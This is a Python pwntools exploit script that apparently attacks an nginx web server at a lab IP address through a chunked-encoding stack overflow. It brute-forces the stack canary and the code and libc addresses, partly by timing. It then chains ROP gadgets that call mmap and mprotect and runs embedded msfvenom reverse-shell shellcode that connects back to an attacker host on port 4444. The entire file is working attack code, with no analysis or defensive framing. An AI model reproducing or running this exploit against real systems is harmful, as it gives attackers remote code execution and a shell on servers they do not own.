#python3
from pwn import *
import time
import sys

# print colors
BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
PURPLE = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
END = '\033[0m'
BOLD = '\038[1m'
UNDERLINE = '\033[4m'
INVISIBLE = '\033[08m'
REVERCE = '\033[07m'
target = "192.168.229.134"
send_base = b'GET / HTTP/1.1\r\nHost: localhost\r\nTransfer-Encoding: chunked\r\n\r\n'
context.log_level = "error"
context.arch = "amd64"
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.229.135 LPORT=4444 -f python

shellcode =  b""
shellcode += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
shellcode += b"\x97\x48\xb9\x02\x00\x11\x5c\xc0\xa8\xe5\x87\x51\x48"
shellcode += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
shellcode += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
shellcode += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
shellcode += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"


# detect canary offset
print(YELLOW +"[*]" + END + " detecting canary position...")
offset = 0
while True:
    r = remote(target, 80)
    message = send_base + b"a" * offset
    r.send(message)
    try:
        response = r.recv()
    except EOFError:
        r.close()
        break
    offset += 1
    r.close()
offset -= 1

# get canary
print(GREEN + "[+]" + END + " canary position is " + str(offset))
print(YELLOW + "[*]" + END + " detecting canary bytes...")
while True:
    canary = b""
    for count in range(0x8):
        for b in range(0x100):
            r = remote(target, 80)
            message = send_base + b"a"*offset + canary + b.to_bytes(1, "big")
            r.send(message)
            try:
                response = r.recv()
            except EOFError:
                r.close()
                continue
            if b"400" not in response:
                continue
            #print(response)
            r.close()
            canary += b.to_bytes(1, "big")
            break
    print(canary)
    if len(canary) != 8:
        print(BLUE + "[-]" + END + " oops. somothing is wrong.")
        continue
    break
print(GREEN +"[+]" + END + " canary is " + hex(u64(canary)))
request_base = send_base + b"a"*offset + canary + b"c"*0x28

# find .text offset
# this method is not stable, sometimes http service will down. PRAY is needed

print(YELLOW + "[*]" + END + " detecting .text offset...")
while True:
    ret_address = b"\x00"
    for count in range(0x7):
        for b in range(0x100):
            byt = b%(0x100)
            r = remote(target, 80)
            message = request_base + ret_address + byt.to_bytes(1, "big")
            r.send(message)
            try:
                respose = r.recv(timeout=10)
            except EOFError:
                r.close()
                continue
            r.close()
            #print(response)
            print(hex(byt))
            print(ret_address)
            ret_address += byt.to_bytes(1, "big")
            break
    if len(ret_address) != 8:
        continue
    ngx_http_discard_request_body33 = u64(ret_address)
    text_offset = ngx_http_discard_request_body33 - 0x000000000007cb00
    if text_offset < 0x600000000000 and text_offset > 0x500000000000:
        break

print(GREEN + "[+] " + END +".text offset is " + hex(text_offset))

request_base = send_base + b"a"*offset + canary + b"c"*0x28
pop_rcx = 0x00133fe3 + text_offset
pop_rdi =  0x000708b1 + text_offset
pop_rsi = 0x00070e37+text_offset
pop_rdx = 0x0026eff4 + text_offset
sprintf = 0x000000000044a20 + text_offset
mov_rdi_rsp_call_rax10 = 0x0010f05a + text_offset
pop_rax = 0x000231f0 + text_offset
pop_r8 = 0x000c0b42 +text_offset
add_rsp8_ret = 0x001b0635 + text_offset
ret = 0x000a4ea8 + text_offset
pop_rbx = 0x000b86f9 + text_offset
buf = p64(pop_rdi)
buf += p64(10)

print(hexdump( request_base + buf ))
print(YELLOW + "[*] " + END +"detecting sleep address...")

#if you have a better idea for finding libc_address, add MODE (but this code is only for me, so ... you should refactor all).

calc_funcs =  {
        "morecore":lambda x,y : (x*0x10 + 0x8).to_bytes(1,"big"),
        }

ranges = {
        "morecore":range(0x1),
        }

ret_depth = {
        "morecore":60,
        }

modes = ["morecore"]


is_sleep_found = False
for mode in modes:
    for s in ranges[mode]:
        for k in range(0x10):

            sleep_address = b"\x70" + calc_funcs[mode](k,s)
            print(hexdump(sleep_address))

            for _ in range(8 - len(sleep_address)):
                l = len(sleep_address)
                for i in range(0x100):
                    r = remote(target,80,timeout=20)
                    if r is None:
                        print(BLUE + "[-]" + END + " nginx master process was dead. please restart nginx process.")
                        sys.exit()

                    r.send(request_base + buf+(p64(ret)*ret_depth[mode]) + sleep_address +i.to_bytes(1,"big"))
                    t1 = time.time()
                    try:
                        response = r.recv(timeout=8)
                        r.close()
                    except EOFError:
                        r.close()

                    if time.time() - t1 < 5:
                        continue

                    print("found " + hex(i))

                    sleep_address += i.to_bytes(1,"big")
                    break
            if len(sleep_address) == 8:
                is_sleep_found = True
                break
        if is_sleep_found:
            break
    if is_sleep_found:
        break
if not is_sleep_found:
    print(BLUE + "[-]" + END + "someting is wrong. morecore not found. change ret depth and check stack layout.")
    sys.exit()

mov_qword_rdi_rax = 0x000810fc
real_sleep = u64(sleep_address)
libc_offset = real_sleep - libc.symbols[b"sleep"]
mov_qword_rdi_rax = 0x000810fc + text_offset
libc_mov_rdi_rax_call_rcx = 0x0009af53 +libc_offset

print(GREEN + "[+]" + END + "libc_sleep is " + hex(libc_offset))

PROT_READ = 0x1
PROT_WRITE = 0x2
PROT_EXEC = 0x4
MAP_PRIVATE = 0x2
MAP_ANONYMOUS = 0x20


def setarg(rdi,rsi,rdx,rcx,r8):
    retbuf = b""
    retbuf += p64(pop_rdi)
    retbuf += p64(rdi)
    retbuf += p64(pop_rsi)
    retbuf += p64(rsi)
    retbuf += p64(pop_rdx)
    retbuf += p64(rdx)
    retbuf += p64(pop_rcx)
    retbuf += p64(rcx)
    retbuf += p64(pop_r8)
    retbuf += p64(r8)
    return retbuf

def callfunc(funcname):
    retbuf = b""
    retbuf += p64(pop_rax)
    retbuf += p64(0)
    retbuf += p64(libc.symbols[funcname.encode("utf-8")]+libc_offset)
    return retbuf
buf = b""
buf += setarg(0,4096,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS,0xffffffffffffffff)
buf += callfunc("mmap")
buf += p64(pop_rcx)
buf += p64(add_rsp8_ret)
buf += p64(libc_mov_rdi_rax_call_rcx)
buf += p64(pop_rsi)
buf += p64(4096)
buf += p64(pop_rdx)
buf += p64(PROT_WRITE|PROT_READ|PROT_EXEC)
buf += callfunc("mprotect")

#create shellcode
libc_add_rdi_rbx_call_rbp = 0x00199c93 +libc_offset
pop_rbp = 0x001af79c + text_offset 
mov_rsi_rdi_callrbp = 0x00183c37 + text_offset
libc_mov_rdi_rsi_callrax = 0x0009d025 + libc_offset
libc_call_rsi = 0x00023471 + libc_offset

def createshellcode(shellcode):
    shellcode = shellcode.ljust(len(shellcode)+(8 - len(shellcode)%8),b"\x90")
    retbuf = b""
    retbuf += p64(pop_rbp)
    retbuf += p64(add_rsp8_ret)
    retbuf += p64(mov_rsi_rdi_callrbp)
    for i in range(0,len(shellcode),8):
        retbuf += p64(pop_rbp)
        retbuf += p64(add_rsp8_ret)
        #step 8
        retbuf += p64(pop_rax)
        retbuf += p64(add_rsp8_ret)
        retbuf += p64(libc_mov_rdi_rsi_callrax)
        retbuf += p64(pop_rbx)
        retbuf += p64(i)
        retbuf += p64(libc_add_rdi_rbx_call_rbp)
        #write 8 byte
        retbuf += p64(pop_rax)
        retbuf += shellcode[i:i+8]
        retbuf += p64(mov_qword_rdi_rax)
    return retbuf

buf += createshellcode(shellcode)
buf += p64(libc_call_rsi)

r = remote(target,80)
r.send(request_base + buf)

print(GREEN + "[+]"+ END + " done")

r.close()
